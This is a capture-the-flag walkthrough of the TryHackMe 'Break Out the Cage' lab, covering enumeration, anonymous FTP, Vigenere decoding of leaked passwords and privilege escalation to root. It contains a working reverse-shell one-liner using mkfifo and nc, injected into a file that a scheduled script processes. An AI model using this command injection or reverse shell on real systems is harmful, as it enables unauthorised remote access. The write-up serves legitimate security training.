# TryHackMe: Break Out the Cage
•	Begin by running a nmap scan on the target machine (a simple ‘nmap <ip address>’ will do here). The results show that there is a http page on port 80. We can go to this page in firefox by entering ‘<ip address>:80’ in a browser.

•	We can run gobuster on this website to enumerate the directory and hopefully find something useful (https://noobsixt9.medium.com/web-enumeration-using-gobuster-8437e7f4618d):
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://<IP>/ -t 16

•	The enumerated directory shows /images, /html, /contracts, /auditions, and /server-status. If we go to the auditions page (http://<IP>:80/audtions) we can find a must_practice_corrupt_file.mp3.

  - I used ‘wget http://<IP:80/auditions/must_practice_corrupt_file.mp3’ to download the mp3 file.

•	You can use Sonic Visualizer to open up the mp3 file. You can add a spectrogram by selecting Layer > Add Pectrogram > <file>. You can adjust the color on the side to make the spectrogram easier to see. If you scroll through the sound file spectrogram, there should be a block that says “namelesstwo”.

•	Let’s revisit the nmap scan. We can add some switches to give us some more information. Enter ‘nmap -A -T5 -oN nmap.txt <IP>’ and wait for it to finish.

 - This will give us some more detailed information and output it to nmap.txt. If we read nmpa.txt, se we can see that the ftp server allows anonymous logins.

![image](https://github.com/user-attachments/assets/26b28c60-5130-4a5a-8f66-ce19826165f3)
 
•	We can do an anonymous login using the command ‘ftp <IP>’ and then using anonymous:anonymous for the username and password.

•	Using ‘ls’, we can see that there is a file called dad_tasks. Enter ‘get dad_tasks’ to download the file.

•	If we read the dad_tasks file we get a jumbled mess of letters, showing that the message has obviously been encoded. I ran the encrypted message identifier (https://www.dcode.fr/cipher-identifier), which showed that it is likely base64 encoded.

•	After decoding the base64, the message is a little more recognizable but is still encoded. This time it looks like it might be a Caesar or Vigenere cipher. The Cryptanalysis tool indicates that it is likely a Vigenere cipher. The automatic decrytper is unable to turn anything up, however if we use the word that we found in the sonic visualizer (namelesstwo) as the key we get the following plaintext message:

Dads Tasks - The RAGE...THE CAGE... THE MAN... THE LEGEND!!!!
One. Revamp the website
Two. Put more quotes in script
Three. Buy bee pesticide
Four. Help him with acting lessons
Five. Teach Dad what "information security" is.

In case I forget.... Mydadisghostrideraintthatcoolnocausehesonfirejokes

•	This last string is Weston’s password. We can ssh into his account (‘ssh weston@<IP>’) using the password.

•	We can see that someone named ‘cage’ keeps outputting quotes. We can try to track down where the quotes are coming from using ‘find / -group cage 2>dev/null’. It looks like it is probably coming from /opt/.dads_scripts/spread_the_quotes.py.

 - Note that many of these files are hidden using a ‘.’, you can use ‘ls -a’ to view all hidden files. Modify the .quotes file under /opt/.dads_scripts/.files/.quotes using the following command (make sure you change the ip to your machine and set up a listener using ‘nc -lvn 9001’, also note that there is another .quotes file in the home directory, this is not the one we want to modify):
  - echo "lol;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.196.78 9001 >/tmp/f" > .quotes

•	After waiting a few minutes, the reverse shell we inserted into .quotes should execute, allowing us to login as cage himself!

•	The user flag can be found in the Super_Duper_Checklist file.

•	Looking through Cage’s email backups, it is clear that he has an impeccable taste in Star Wars movies.

 - Why did I not get a role in the new fan made Star Wars films?! There was 3 of them! 3 Sean! I mean yes they were terrible films. I could of made them great... great Sean.... I think you're missing my true potential.

 - We can also tell from this email that Sean (Cage’s agent) is the root user.
•	On a side note, in email_3 we are able to find a message that was apparently left by Cage’s agent reading “haiinspsyanileph”.

 - This string is actually a Vigenere cipher, which we can decrypt with the key “face” that shows up multiple times in email_3 to get “cageisnotalegend”.

•	If we go back to the page where we logged in as Weston we can switch to the root account using this password with ‘su root’.

•	Logging in as root we can view email_2 in the email_backup folder to find the root flag and break out of the Cage!!!

![image](https://github.com/user-attachments/assets/d55db5d9-8d69-49bf-be7a-f515d6e3b53d)

 
